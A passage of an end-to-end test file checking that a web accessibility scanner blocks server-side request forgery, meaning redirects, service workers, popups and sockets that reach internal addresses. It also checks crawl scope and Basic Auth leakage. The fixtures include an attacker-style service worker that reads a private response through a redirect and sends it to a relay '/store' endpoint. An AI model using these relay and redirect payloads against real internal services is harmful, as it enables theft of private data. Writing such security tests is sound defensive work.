/**
 * Real-browser coverage for scan-target security: what the scanner analyses,
 * stores and follows when a navigation fails, leaves the allowed targets, or
 * leaves the crawl scope.
 *
 * Needs Playwright's Chromium (`npx playwright install chromium`); no Redis.
 * Run alone with:
 *   npx jest --config ./test/jest-e2e.json test/scan-target-security.e2e-spec.ts
 */
import { randomBytes } from 'node:crypto';
import { createSocket, Socket as UdpSocket } from 'node:dgram';
import { join } from 'node:path';
import { ServerResponse } from 'node:http';
import { AddressInfo, createServer as createTcpServer, Server } from 'node:net';
import { DataSource, Repository } from 'typeorm';
import { Job } from 'bullmq';
import { Browser, chromium } from 'playwright';
import { Scan } from '../src/entities/scan.entity';
import { Issue } from '../src/entities/issue.entity';
import { AgentFinding } from '../src/entities/agent-finding.entity';
import { ScanMode } from '../src/enums/scan-mode.enum';
import { ScanStatus } from '../src/enums/scan-status.enum';
import { CrawlStrategy } from '../src/enums/crawl-strategy.enum';
import { BrowserService } from '../src/services/browser.service';
import {
  AxeAccessibilityScanner,
  TargetPolicyViolationError,
} from '../src/services/axe-accessibility-scanner.service';
import { ScanProcessor } from '../src/services/scan.processor';
import { BasicAuthCryptoService } from '../src/services/basic-auth-crypto.service';
import { scanConfig } from '../src/config/configuration';
import { UrlPolicyService } from '../src/services/url-policy.service';
import type { AgentAuditService } from '../src/agent/agent-audit.service';
import {
  FixtureSiteServer,
  startFixtureSiteServer,
} from './helpers/fixture-site-server';

/** An HTML page with an axe violation (image without alt) and a marker title. */
function violatingPage(
  response: ServerResponse,
  status: number,
  title: string,
) {
  response.statusCode = status;
  response.setHeader('content-type', 'text/html; charset=utf-8');
  response.end(
    `<!doctype html><html lang="en"><head><title>${title}</title></head>` +
      `<body><h1>${title}</h1><img src="/pixel.png"></body></html>`,
  );
}

/** A 1x1 PNG. */
const PNG_BASE64 =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

/** Credentials the protected fixture page expects. */
const BASIC_AUTH = { username: 'scanner', password: 's3cret' };
const BASIC_AUTH_HEADER = `Basic ${Buffer.from(
  `${BASIC_AUTH.username}:${BASIC_AUTH.password}`,
).toString('base64')}`;

/** Answers with a redirect to the given absolute URL. */
function redirectTo(location: () => string) {
  return (_req: unknown, response: ServerResponse) => {
    response.statusCode = 302;
    response.setHeader('location', location());
    response.end();
  };
}

/** Answers with an accessible HTML page whose body is `body`. */
function htmlPage(title: string, body: string) {
  return (_req: unknown, response: ServerResponse) => {
    response.statusCode = 200;
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end(
      `<!doctype html><html lang="en"><head><title>${title}</title></head>` +
        `<body><main><h1>${title}</h1>${body}</main></body></html>`,
    );
  };
}

describe('Scan target security (real browser)', () => {
  jest.setTimeout(120000);

  const fixtureRoot = join(__dirname, 'fixtures', 'site');
  let site: FixtureSiteServer;
  /**
   * Stands in for an internal service. It listens on loopback like the site,
   * but is addressed as `localhost`, which the policy blocks while the site's
   * `127.0.0.1` is on the host allowlist.
   */
  let internal: FixtureSiteServer;
  /**
   * A second allowed origin (127.0.0.1, another port) run by the attacker:
   * a popup page with a service worker, and a store that relays what the
   * worker read to the scanned page.
   */
  let relay: FixtureSiteServer;
  /** What the relay's service worker stored. */
  let relayed = '';
  let dataSource: DataSource;
  let scanRepository: Repository<Scan>;
  let issueRepository: Repository<Issue>;
  let browserService: BrowserService;
  let agentAudit: {
    resolveSkills: jest.Mock;
    reset: jest.Mock;
    collectForPage: jest.Mock;
    remainingScanUnits: jest.Mock;
    evaluate: jest.Mock;
  };

  const siteUrl = (path: string): string => `${site.baseUrl}${path}`;
  const internalUrl = (path: string): string =>
    `http://localhost:${internal.port}${path}`;
  const relayUrl = (path: string): string => `${relay.baseUrl}${path}`;
  /** The site under its loopback name instead of its address. */
  const loopbackNameUrl = (path: string): string =>
    `http://localhost:${site.port}${path}`;
  /**
   * Port of a TCP and UDP sink that the connection-API page points every
   * socket at (see 'page APIs Playwright cannot route').
   */
  let sinkPort = 0;
  /** Policy of a deployment that only allowlists the site's host. */
  const guarded = {
    allowPrivateTargets: false,
    targetAllowHosts: ['127.0.0.1'],
  };

  /** Builds a processor whose policy and browser guard share one config. */
  function buildProcessor(
    overrides: Partial<ReturnType<typeof scanConfig>> = {},
  ): { processor: ScanProcessor; scanner: AxeAccessibilityScanner } {
    const config = { ...scanConfig(), ...overrides };
    const urlPolicy = new UrlPolicyService(config);
    const scanner = new AxeAccessibilityScanner(config, urlPolicy);
    const processor = new ScanProcessor(
      scanRepository,
      issueRepository,
      browserService,
      scanner,
      new BasicAuthCryptoService(),
      config,
      urlPolicy,
      agentAudit as unknown as AgentAuditService,
    );
    return { processor, scanner };
  }

  async function createPendingScan(overrides: Partial<Scan>): Promise<Scan> {
    return scanRepository.save(
      scanRepository.create({
        mode: ScanMode.SINGLE_URL,
        targets: [siteUrl('/index.html')],
        rootElement: undefined,
        ruleIds: null,
        crawlMaxPages: null,
        crawlMaxDepth: null,
        crawlStrategy: null,
        crawlGlobs: null,
        crawlExcludeGlobs: null,
        status: ScanStatus.PENDING,
        pagesDiscovered: 0,
        pagesScanned: 0,
        pagesFailed: 0,
        ...overrides,
      }),
    );
  }

  async function runScan(
    processor: ScanProcessor,
    overrides: Partial<Scan>,
  ): Promise<Scan> {
    const scan = await createPendingScan(overrides);
    await processor.process({ data: { scanId: scan.id } } as Job);
    const completed = await scanRepository.findOne({
      where: { id: scan.id },
      relations: { issues: true },
    });
    if (!completed) throw new Error(`Scan ${scan.id} vanished`);
    return completed;
  }

  beforeAll(async () => {
    internal = await startFixtureSiteServer(fixtureRoot, {
      routes: {
        '/secret': (_req, res) => violatingPage(res, 200, 'Internal secret'),
        // A private service that lets any origin read it.
        '/secret-cors': (_req, res) => {
          res.setHeader('access-control-allow-origin', '*');
          res.end('TOPSECRET');
        },
        '/frame': (_req, res) => violatingPage(res, 200, 'Internal frame'),
        // Another origin asking for Basic credentials (a subresource / a
        // redirect target). Chromium only lets same-site subresources and
        // navigations raise the challenge, which Playwright then answers.
        '/auth-pixel': (_req, res) => {
          res.statusCode = 401;
          res.setHeader('www-authenticate', 'Basic realm="other"');
          res.end();
        },
        '/auth-page': (req, res) => {
          if (!req.headers.authorization) {
            res.statusCode = 401;
            res.setHeader('www-authenticate', 'Basic realm="other"');
            res.end();
            return;
          }
          htmlPage('Other login', '<p>Signed in</p>')(req, res);
        },
        '/evil.js': (_req, res) => {
          res.setHeader('content-type', 'application/javascript');
          res.end("document.title = 'Internal script ran';");
        },
      },
    });
    relay = await startFixtureSiteServer(fixtureRoot, {
      routes: {
        '/popup.html': htmlPage(
          'Popup',
          "<script>navigator.serviceWorker.register('/relay-sw.js');</script>",
        ),
        // Reads a private response through a redirect and stores it here.
        '/relay-sw.js': (_req, res) => {
          res.setHeader('content-type', 'application/javascript');
          res.end(
            "self.addEventListener('install', (event) => { event.waitUntil((async () => {" +
              " const read = await (await fetch('/r/to-internal')).text();" +
              " await fetch('/store?d=' + encodeURIComponent(read)); })().catch(() => {}));" +
              ' self.skipWaiting(); });',
          );
        },
        '/r/to-internal': redirectTo(() => internalUrl('/secret-cors')),
        '/store': (req, res) => {
          relayed =
            new URL(req.url ?? '/', 'http://relay').searchParams.get('d') ?? '';
          res.end('ok');
        },
        '/load': (_req, res) => {
          res.setHeader('access-control-allow-origin', '*');
          res.end(relayed);
        },
        // A popup whose own image redirects to a private address.
        '/popup-with-blocked-hop.html': htmlPage(
          'Popup with a blocked image',
          '<img alt="" src="/r/image-to-internal">',
        ),
        '/r/image-to-internal': redirectTo(() => internalUrl('/frame')),
      },
    });
    site = await startFixtureSiteServer(fixtureRoot, {
      routes: {
        '/not-found': (_req, res) => violatingPage(res, 404, 'Missing page'),
        '/server-error': (_req, res) => violatingPage(res, 500, 'Broken page'),
        '/to-internal': redirectTo(() => internalUrl('/secret')),
        '/protected': (req, res) => {
          if (req.headers.authorization !== BASIC_AUTH_HEADER) {
            res.statusCode = 401;
            res.setHeader('www-authenticate', 'Basic realm="staging"');
            res.end();
            return;
          }
          htmlPage(
            'Protected page',
            // Same site (127.0.0.1), other origin (port).
            `<img alt="Partner logo" src="http://127.0.0.1:${internal.port}/auth-pixel">` +
              '<script src="/slow.js"></script>',
          )(req, res);
        },
        '/to-other-login': redirectTo(() => internalUrl('/auth-page')),
        '/alias-a': redirectTo(() => siteUrl('/about.html')),
        '/alias-b': redirectTo(() => siteUrl('/about.html')),
        // Seeds given under another name of the site's host.
        '/to-loopback-home': redirectTo(() => siteUrl('/crawl-home')),
        '/crawl-home': (req, res) =>
          htmlPage(
            'Crawl home',
            '<img src="/pixel.png"><nav><a href="/about.html">About</a>' +
              ` <a href="${loopbackNameUrl('/index.html')}">Home by name</a></nav>`,
          )(req, res),
        '/crawl-start': htmlPage(
          'Crawl start',
          '<nav><a href="/to-internal">Partner</a> <a href="/alias-a">About</a>' +
            ' <a href="/alias-b">About us</a></nav>',
        ),
        '/r/frame': redirectTo(() => internalUrl('/frame')),
        // A host no resolver knows (RFC 6761 reserves .invalid), and one only
        // the browser resolves (see browserOnlyResolver).
        '/r/nxdomain': redirectTo(() => 'http://nxdomain.invalid/pixel.png'),
        '/r/browser-only': redirectTo(
          () => `http://browser-only.invalid:${site.port}/logo.png`,
        ),
        '/logo.png': (_req, res) => {
          res.setHeader('content-type', 'image/png');
          res.end(Buffer.from(PNG_BASE64, 'base64'));
        },
        '/image-to-nxdomain': htmlPage(
          'Has an image that redirects to a missing host',
          '<img src="/r/nxdomain"><img src="/pixel.png">',
        ),
        '/frame-to-nxdomain': htmlPage(
          'Has a frame that redirects to a missing host',
          '<iframe title="Ad" src="/r/nxdomain"></iframe><img src="/pixel.png">',
        ),
        '/crawl-nxdomain': htmlPage(
          'Crawl start with a missing-host image',
          '<img src="/r/nxdomain" alt=""><a href="/about.html">About</a>',
        ),
        '/image-to-browser-only': htmlPage(
          'Has an image that redirects to a host only the browser resolves',
          '<img alt="Logo" src="/r/browser-only"><script src="/slow.js"></script>',
        ),
        '/r/script': redirectTo(() => internalUrl('/evil.js')),
        // Holds back DOMContentLoaded so an iframe's redirect resolves first.
        '/slow.js': (_req, res) => {
          setTimeout(() => {
            res.setHeader('content-type', 'application/javascript');
            res.end('void 0;');
          }, 300);
        },
        '/frame-to-internal': htmlPage(
          'Embeds a redirecting frame',
          '<iframe title="Widget" src="/r/frame"></iframe><script src="/slow.js"></script>',
        ),
        '/script-to-internal': htmlPage(
          'Loads a redirecting script',
          '<script src="/r/script"></script>',
        ),
        '/direct-internal-image': htmlPage(
          'References an internal image',
          `<img alt="Logo" src="${internalUrl('/direct.png')}">`,
        ),
        '/websocket-to-internal': htmlPage(
          'Opens an internal WebSocket',
          `<script>
            window.socketOutcome = new Promise((resolve) => {
              const socket = new WebSocket('ws://localhost:${internal.port}/live');
              socket.onopen = () => resolve('open');
              socket.onclose = (event) => resolve('closed ' + event.code);
            });
          </script>`,
        ),
        // Uses every API Playwright cannot route, without feature detection,
        // then renders two axe violations.
        '/uses-connection-apis': (req, res) =>
          htmlPage(
            'Uses connection APIs',
            `<script>
              const sink = '127.0.0.1:${sinkPort}';
              window.outcomes = [];
              const worker = new SharedWorker('/shared-worker.js');
              worker.onerror = () => outcomes.push('SharedWorker error');
              const stream = new WebSocketStream('ws://' + sink + '/live');
              stream.opened.catch(() => outcomes.push('WebSocketStream refused'));
              const transport = new WebTransport('https://' + sink + '/wt');
              transport.ready.catch(() => outcomes.push('WebTransport refused'));
              const peer = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:' + sink }, { urls: 'turn:' + sink + '?transport=tcp', username: 'u', credential: 'p' }],
              });
              peer.onicegatheringstatechange = () => {
                if (peer.iceGatheringState === 'complete') outcomes.push('ICE gathering complete');
              };
              peer.createDataChannel('chat');
              peer.createOffer().then((offer) => peer.setLocalDescription(offer));
              document.querySelector('main').insertAdjacentHTML(
                'beforeend', '<img src="/pixel.png"><button></button>');
            </script>`,
          )(req, res),
        '/shared-worker.js': (_req, res) => {
          res.setHeader('content-type', 'application/javascript');
          res.end('onconnect = () => {};');
        },
        '/r/sw-to-internal': redirectTo(() => internalUrl('/secret')),
        '/sw-redirect.js': (_req, res) => {
          res.setHeader('content-type', 'application/javascript');
          res.end(
            "self.addEventListener('install', (event) => {" +
              " event.waitUntil(fetch('/r/sw-to-internal', { mode: 'no-cors' }).catch(() => {}));" +
              ' self.skipWaiting(); });',
          );
        },
        // Opens a popup on the relay origin, then shows what the relay
        // stored. It never loads the relay's origin itself.
        '/relay-victim': (req, res) =>
          htmlPage(
            'Relay victim',
            `<script>
              window.open('${relayUrl('/popup.html')}');
              (async () => {
                for (let i = 0; i < 100; i++) {
                  const data = await (await fetch('${relayUrl('/load')}')).text();
                  if (data) {
                    document.querySelector('main').insertAdjacentHTML(
                      'beforeend', '<img src="/pixel.png" data-leak="' + data + '">');
                    return;
                  }
                  await new Promise((resolve) => setTimeout(resolve, 50));
                }
              })();
            </script><script src="/after-relay.js"></script>`,
          )(req, res),
        // Holds back DOMContentLoaded until the relay stored what it read
        // (at most ten seconds), so the scan sees the relay happen.
        '/after-relay.js': (_req, res) => {
          const started = Date.now();
          const poll = setInterval(() => {
            if (!relayed && Date.now() - started < 10_000) return;
            clearInterval(poll);
            res.setHeader('content-type', 'application/javascript');
            res.end('void 0;');
          }, 20);
        },
        '/opens-popup-with-blocked-hop': (req, res) =>
          htmlPage(
            'Opens a popup',
            `<script>window.open('${relayUrl('/popup-with-blocked-hop.html')}');</script>` +
              '<script src="/slower.js"></script>',
          )(req, res),
        // Holds back DOMContentLoaded long enough for a popup to load.
        '/slower.js': (_req, res) => {
          setTimeout(() => {
            res.setHeader('content-type', 'application/javascript');
            res.end('void 0;');
          }, 3000);
        },
        '/sw.js': (_req, res) => {
          res.setHeader('content-type', 'application/javascript');
          res.end(
            "self.addEventListener('install', (event) => {" +
              ` event.waitUntil(fetch('${internalUrl('/from-service-worker')}').catch(() => {}));` +
              ' self.skipWaiting(); });',
          );
        },
      },
    });

    dataSource = new DataSource({
      type: 'better-sqlite3',
      database: ':memory:',
      entities: [Scan, Issue, AgentFinding],
      synchronize: true,
    });
    await dataSource.initialize();
    scanRepository = dataSource.getRepository(Scan);
    issueRepository = dataSource.getRepository(Issue);
    browserService = new BrowserService(scanConfig());
  });

  afterAll(async () => {
    await browserService.onApplicationShutdown('test teardown');
    await dataSource.destroy();
    await site.close();
    await internal.close();
    await relay.close();
  });

  beforeEach(async () => {
    await issueRepository.clear();
    await scanRepository.clear();
    site.requests.length = 0;
    internal.requests.length = 0;
    relayed = '';
    // A requested AI audit makes evidence collection observable: it must
    // never see a page whose content is rejected.
    agentAudit = {
      resolveSkills: jest.fn().mockReturnValue([{ id: 'page_title' }]),
      reset: jest.fn().mockResolvedValue(undefined),
      collectForPage: jest.fn().mockResolvedValue([]),
      remainingScanUnits: jest.fn().mockReturnValue(100),
      evaluate: jest.fn().mockResolvedValue(undefined),
    };
  });

  describe('HTTP error pages', () => {
    it('counts 4xx/5xx navigations as failed and stores none of their content', async () => {
      const { processor } = buildProcessor({ allowPrivateTargets: true });

      const scan = await runScan(processor, {
        mode: ScanMode.URL_LIST,
        targets: [
          siteUrl('/index.html'),
          siteUrl('/not-found'),
          siteUrl('/server-error'),
        ],
      });

      expect(scan.status).toBe(ScanStatus.COMPLETED);
      expect(scan.pagesDiscovered).toBe(3);
      expect(scan.pagesScanned).toBe(1);
      expect(scan.pagesFailed).toBe(2);
      const issuePages = new Set(scan.issues.map((issue) => issue.pageUrl));
      expect([...issuePages]).toEqual([siteUrl('/index.html')]);
      expect(agentAudit.collectForPage).toHaveBeenCalledTimes(1);
    });
  });

  describe('target policy in the browser', () => {
    it('fails a page that redirects to a blocked address and keeps nothing from it', async () => {
      const { processor } = buildProcessor(guarded);

      const scan = await runScan(processor, {
        mode: ScanMode.SINGLE_URL,
        targets: [siteUrl('/to-internal')],
      });

      expect(scan.status).toBe(ScanStatus.COMPLETED);
      expect(scan.pagesScanned).toBe(0);
      expect(scan.pagesFailed).toBe(1);
      expect(scan.issues).toEqual([]);
      expect(agentAudit.collectForPage).not.toHaveBeenCalled();
    });

    it('names the blocked redirect target and closes the page', async () => {
      const { scanner } = buildProcessor(guarded);
      const context = await scanner.createContext(
        await browserService.getBrowser(),
      );
      try {
        const page = await context.newPage();

        await expect(
          scanner.scanPage(page, siteUrl('/to-internal')),
        ).rejects.toThrow(TargetPolicyViolationError);
        await expect(scanner.assertPageAllowed(page)).rejects.toThrow(
          internalUrl('/secret'),
        );
        expect(page.isClosed()).toBe(true);
      } finally {
        await context.close();
      }
    });

    it('fails pages whose iframe or script follows a redirect to a blocked address', async () => {
      const { processor } = buildProcessor(guarded);

      const scan = await runScan(processor, {
        mode: ScanMode.URL_LIST,
        targets: [
          siteUrl('/frame-to-internal'),
          siteUrl('/script-to-internal'),
          siteUrl('/index.html'),
        ],
      });

      expect(scan.pagesScanned).toBe(1);
      expect(scan.pagesFailed).toBe(2);
      const issuePages = new Set(scan.issues.map((issue) => issue.pageUrl));
      expect([...issuePages]).toEqual([siteUrl('/index.html')]);
      expect(agentAudit.collectForPage).toHaveBeenCalledTimes(1);
    });

    it('still scans a page whose direct request to a blocked address is aborted unsent', async () => {
      const { processor } = buildProcessor(guarded);

      const scan = await runScan(processor, {
        mode: ScanMode.SINGLE_URL,
        targets: [siteUrl('/direct-internal-image')],
      });

      expect(scan.pagesScanned).toBe(1);
      expect(scan.pagesFailed).toBe(0);
      expect(internal.requests).toEqual([]);
    });

    describe('redirect hops to hosts the policy cannot resolve', () => {
      /**
       * A browser whose resolver knows `browser-only.invalid` (as the site's
       * address), which the API's resolver does not: DNS that differs between
       * the API and the browser.
       */
      let browserOnlyResolver: Browser;

      beforeAll(async () => {
        browserOnlyResolver = await chromium.launch({
          args: ['--host-resolver-rules=MAP browser-only.invalid 127.0.0.1'],
        });
      });

      afterAll(async () => {
        await browserOnlyResolver.close();
      });

      it.each(['/image-to-nxdomain', '/frame-to-nxdomain'])(
        'scans %s, whose redirect hop the browser fails too',
        async (path) => {
          const { processor } = buildProcessor(guarded);

          const scan = await runScan(processor, {
            mode: ScanMode.SINGLE_URL,
            targets: [siteUrl(path)],
          });

          expect(scan.pagesScanned).toBe(1);
          expect(scan.pagesFailed).toBe(0);
          expect(scan.issues.map((issue) => issue.ruleId)).toContain(
            'image-alt',
          );
          expect(agentAudit.collectForPage).toHaveBeenCalledTimes(1);
        },
      );

      it('keeps crawling from a seed whose template has such a hop', async () => {
        const { processor } = buildProcessor(guarded);

        const scan = await runScan(processor, {
          mode: ScanMode.CRAWL,
          targets: [siteUrl('/crawl-nxdomain')],
          crawlMaxPages: 5,
          crawlMaxDepth: 1,
          crawlStrategy: CrawlStrategy.SameHostname,
        });

        expect(scan.pagesScanned).toBe(2);
        expect(scan.pagesFailed).toBe(0);
      });

      it('rejects a page when the browser got a response from such a host', async () => {
        const { scanner } = buildProcessor(guarded);
        const context = await scanner.createContext(browserOnlyResolver);
        try {
          const page = await context.newPage();

          const scan = scanner.scanPage(
            page,
            siteUrl('/image-to-browser-only'),
          );

          await expect(scan).rejects.toThrow(TargetPolicyViolationError);
          await expect(scan).rejects.toThrow('browser-only.invalid');
          expect(
            site.requests.some(
              (request) =>
                request.headers.host === `browser-only.invalid:${site.port}`,
            ),
          ).toBe(true);
        } finally {
          await context.close();
        }
      });
    });

    it('refuses a WebSocket to a blocked address before it connects', async () => {
      const { scanner } = buildProcessor(guarded);
      const context = await scanner.createContext(
        await browserService.getBrowser(),
      );
      try {
        const page = await context.newPage();
        await scanner.scanPage(page, siteUrl('/websocket-to-internal'));

        const outcome = await page.evaluate(
          () =>
            (window as unknown as { socketOutcome: Promise<string> })
              .socketOutcome,
        );
        expect(outcome).toBe('closed 1008');
        expect(internal.requests).toEqual([]);
      } finally {
        await context.close();
      }
    });

    it('routes service-worker requests, even when registered past the page API', async () => {
      const { scanner } = buildProcessor(guarded);
      const context = await scanner.createContext(
        await browserService.getBrowser(),
      );
      try {
        const page = await context.newPage();
        await page.goto(siteUrl('/index.html'));

        const registered = await page.evaluate(async () => {
          const container = navigator.serviceWorker;
          const registration =
            await ServiceWorkerContainer.prototype.register.call(
              container,
              '/sw.js',
            );
          const worker = registration.installing ?? registration.active;
          await new Promise<void>((resolve) => {
            if (!worker || worker.state === 'activated') return resolve();
            worker.addEventListener('statechange', () => {
              if (worker.state === 'activated') resolve();
            });
          });
          return true;
        });

        expect(registered).toBe(true);
        expect(internal.requests).toEqual([]);
      } finally {
        await context.close();
      }
    });

    it('rejects every open page when a service worker hop is blocked', async () => {
      const { scanner } = buildProcessor(guarded);
      const context = await scanner.createContext(
        await browserService.getBrowser(),
      );
      try {
        // A page of another allowed origin, which never loads the worker's.
        const bystander = await context.newPage();
        await bystander.goto(relayUrl('/index.html'));
        const client = await context.newPage();
        await client.goto(siteUrl('/index.html'));

        // The guard may close the page while it registers the worker.
        await client
          .evaluate(() =>
            ServiceWorkerContainer.prototype.register.call(
              navigator.serviceWorker,
              '/sw-redirect.js',
            ),
          )
          .catch(() => undefined);
        for (let waited = 0; !bystander.isClosed() && waited < 5000; ) {
          await new Promise((resolve) => setTimeout(resolve, 50));
          waited += 50;
        }

        await expect(scanner.assertPageAllowed(client)).rejects.toThrow(
          internalUrl('/secret'),
        );
        await expect(scanner.assertPageAllowed(bystander)).rejects.toThrow(
          internalUrl('/secret'),
        );
      } finally {
        await context.close();
      }
    });

    it("rejects a page that a popup's service worker relays a blocked response to", async () => {
      const { scanner } = buildProcessor(guarded);
      const context = await scanner.createContext(
        await browserService.getBrowser(),
      );
      try {
        const page = await context.newPage();

        const scan = scanner.scanPage(page, siteUrl('/relay-victim'));

        await expect(scan).rejects.toThrow(TargetPolicyViolationError);
        await expect(scan).rejects.toThrow(internalUrl('/secret-cors'));
        // The relay worked; the scanner kept nothing of it.
        expect(
          internal.requests.some((request) => request.url === '/secret-cors'),
        ).toBe(true);
      } finally {
        await context.close();
      }
    });

    it('rejects the page that opened a popup whose redirect hop is blocked', async () => {
      const { scanner } = buildProcessor(guarded);
      const context = await scanner.createContext(
        await browserService.getBrowser(),
      );
      try {
        const page = await context.newPage();

        const scan = scanner.scanPage(
          page,
          siteUrl('/opens-popup-with-blocked-hop'),
        );

        await expect(scan).rejects.toThrow(/popup it opened was rejected/);
        await expect(scan).rejects.toThrow(internalUrl('/frame'));
      } finally {
        await context.close();
      }
    });

    describe('page APIs Playwright cannot route', () => {
      let tcpSink: Server;
      let udpSink: UdpSocket;
      /** Connections and datagrams the sink received. */
      const sinkTraffic: string[] = [];

      beforeAll(async () => {
        tcpSink = createTcpServer((socket) => {
          sinkTraffic.push('tcp connection');
          socket.destroy();
        });
        await new Promise<void>((resolve) =>
          tcpSink.listen(0, '127.0.0.1', resolve),
        );
        sinkPort = (tcpSink.address() as AddressInfo).port;
        udpSink = createSocket('udp4');
        udpSink.on('message', () => sinkTraffic.push('udp datagram'));
        await new Promise<void>((resolve) =>
          udpSink.bind(sinkPort, '127.0.0.1', resolve),
        );
      });

      afterAll(async () => {
        await new Promise<void>((resolve) => udpSink.close(() => resolve()));
        await new Promise<void>((resolve) => tcpSink.close(() => resolve()));
      });

      beforeEach(() => {
        sinkTraffic.length = 0;
      });

      /** Opens the page and waits for what its script reported. */
      async function pageOutcomes(
        overrides: Partial<ReturnType<typeof scanConfig>>,
        expected: number,
      ): Promise<{ outcomes: string[]; replaced: Record<string, string[]> }> {
        const { scanner } = buildProcessor(overrides);
        const context = await scanner.createContext(
          await browserService.getBrowser(),
        );
        try {
          const page = await context.newPage();
          await page.goto(siteUrl('/uses-connection-apis'));
          await page.waitForFunction(
            (count) =>
              (window as unknown as { outcomes: string[] }).outcomes.length >=
              count,
            expected,
          );
          // Room for a connection attempt that is still on its way.
          await page.waitForTimeout(500);
          return await page.evaluate(() => {
            const names = [
              'SharedWorker',
              'WebSocketStream',
              'WebTransport',
              'RTCPeerConnection',
            ];
            const frame = document.createElement('iframe');
            document.body.append(frame);
            const scopes = {
              page: globalThis as unknown as Record<string, unknown>,
              frame: frame.contentWindow as unknown as Record<string, unknown>,
            };
            return {
              outcomes: [
                ...(window as unknown as { outcomes: string[] }).outcomes,
              ].sort(),
              // Stand-ins are not native code.
              replaced: Object.fromEntries(
                Object.entries(scopes).map(([where, scope]) => [
                  where,
                  names.filter(
                    (name) =>
                      typeof scope[name] === 'function' &&
                      !Function.prototype.toString
                        .call(scope[name])
                        .includes('[native code]'),
                  ),
                ]),
              ),
            };
          });
        } finally {
          await context.close();
        }
      }

      it('lets the native APIs connect without the guard (control)', async () => {
        await pageOutcomes({ allowPrivateTargets: true }, 1);

        expect(sinkTraffic).toContain('tcp connection');
        expect(sinkTraffic).toContain('udp datagram');
      });

      it('replaces them with stand-ins that fail like a refused connection and never connect', async () => {
        const { outcomes, replaced } = await pageOutcomes(guarded, 4);

        expect(outcomes).toEqual([
          'ICE gathering complete',
          'SharedWorker error',
          'WebSocketStream refused',
          'WebTransport refused',
        ]);
        const all = [
          'SharedWorker',
          'WebSocketStream',
          'WebTransport',
          'RTCPeerConnection',
        ];
        expect(replaced).toEqual({ page: all, frame: all });
        expect(sinkTraffic).toEqual([]);
        expect(
          site.requests.filter((request) =>
            request.url.startsWith('/shared-worker.js'),
          ),
        ).toEqual([]);
        expect(internal.requests).toEqual([]);
      });

      it('scans a page that uses them without feature detection', async () => {
        const { processor } = buildProcessor(guarded);

        const scan = await runScan(processor, {
          mode: ScanMode.SINGLE_URL,
          targets: [siteUrl('/uses-connection-apis')],
        });

        expect(scan.pagesScanned).toBe(1);
        expect(scan.issues.map((issue) => issue.ruleId).sort()).toEqual([
          'button-name',
          'image-alt',
        ]);
        expect(sinkTraffic).toEqual([]);
      });
    });
  });

  describe('crawl scope across redirects', () => {
    it('neither follows a link off the seed host nor scans a redirect target twice', async () => {
      // Both hosts are reachable; only the crawl scope keeps the crawl home.
      const { processor } = buildProcessor({ allowPrivateTargets: true });

      const scan = await runScan(processor, {
        mode: ScanMode.CRAWL,
        targets: [siteUrl('/crawl-start')],
        crawlMaxPages: 10,
        crawlMaxDepth: 1,
        crawlStrategy: CrawlStrategy.SameHostname,
      });

      expect(scan.status).toBe(ScanStatus.COMPLETED);
      const issuePages = new Set(scan.issues.map((issue) => issue.pageUrl));
      expect([...issuePages]).toEqual([siteUrl('/about.html')]);
      const aboutButtonIssues = scan.issues.filter(
        (issue) => issue.ruleId === 'button-name',
      );
      expect(aboutButtonIssues).toHaveLength(1);
      // Seed + about; the off-host link and the second alias are no pages.
      expect(scan.pagesDiscovered).toBe(2);
      expect(scan.pagesScanned).toBe(2);
      expect(scan.pagesFailed).toBe(0);
    });

    it('crawls from the landing URL of a seed that redirects to another host name', async () => {
      // localhost → 127.0.0.1: no registrable domain on either side.
      const { processor } = buildProcessor({ allowPrivateTargets: true });

      const scan = await runScan(processor, {
        mode: ScanMode.CRAWL,
        targets: [loopbackNameUrl('/to-loopback-home')],
        crawlMaxPages: 10,
        crawlMaxDepth: 1,
        crawlStrategy: CrawlStrategy.SameHostname,
      });

      expect(scan.status).toBe(ScanStatus.COMPLETED);
      // Landing page + about; the link back to the seed's host name is out
      // of the landing URL's scope.
      expect(scan.pagesDiscovered).toBe(2);
      expect(scan.pagesScanned).toBe(2);
      expect(scan.pagesFailed).toBe(0);
      const issuePages = new Set(scan.issues.map((issue) => issue.pageUrl));
      expect(issuePages).toEqual(
        new Set([siteUrl('/crawl-home'), siteUrl('/about.html')]),
      );
    });

    it('fails a seed whose landing URL is blocked and follows nothing from it', async () => {
      const { processor } = buildProcessor(guarded);

      const scan = await runScan(processor, {
        mode: ScanMode.CRAWL,
        targets: [siteUrl('/to-internal')],
        crawlMaxPages: 10,
        crawlMaxDepth: 1,
        crawlStrategy: CrawlStrategy.SameHostname,
      });

      expect(scan.pagesDiscovered).toBe(1);
      expect(scan.pagesScanned).toBe(0);
      expect(scan.pagesFailed).toBe(1);
      expect(scan.issues).toEqual([]);
      expect(agentAudit.collectForPage).not.toHaveBeenCalled();
    });
  });

  describe('Basic Auth credentials', () => {
    const originalKey = process.env.ENCRYPTION_KEY;

    beforeAll(() => {
      process.env.ENCRYPTION_KEY = randomBytes(32).toString('base64');
    });

    afterAll(() => {
      if (originalKey === undefined) delete process.env.ENCRYPTION_KEY;
      else process.env.ENCRYPTION_KEY = originalKey;
    });

    /** Runs a single_url scan of `path` with the fixture credentials. */
    async function scanWithCredentials(path: string): Promise<Scan> {
      const encrypted = new BasicAuthCryptoService().encryptCredentials(
        BASIC_AUTH,
      );
      const { processor } = buildProcessor({ allowPrivateTargets: true });
      return runScan(processor, {
        mode: ScanMode.SINGLE_URL,
        targets: [siteUrl(path)],
        basicAuthUsernameEncrypted: encrypted.encryptedUsername,
        basicAuthPasswordEncrypted: encrypted.encryptedPassword,
      });
    }

    it("answers the target origin's challenge but not a same-site subresource's", async () => {
      const scan = await scanWithCredentials('/protected');

      expect(scan.pagesScanned).toBe(1);
      expect(scan.pagesFailed).toBe(0);
      expect(
        site.requests.some(
          (request) =>
            request.url === '/protected' &&
            request.headers.authorization === BASIC_AUTH_HEADER,
        ),
      ).toBe(true);
      const pixelRequests = internal.requests.filter(
        (request) => request.url === '/auth-pixel',
      );
      expect(pixelRequests.length).toBeGreaterThan(0);
      expect(
        pixelRequests.map((request) => request.headers.authorization),
      ).toEqual(pixelRequests.map(() => undefined));
    });

    it('does not answer the challenge of a redirect target on another site', async () => {
      const scan = await scanWithCredentials('/to-other-login');

      const loginRequests = internal.requests.filter(
        (request) => request.url === '/auth-page',
      );
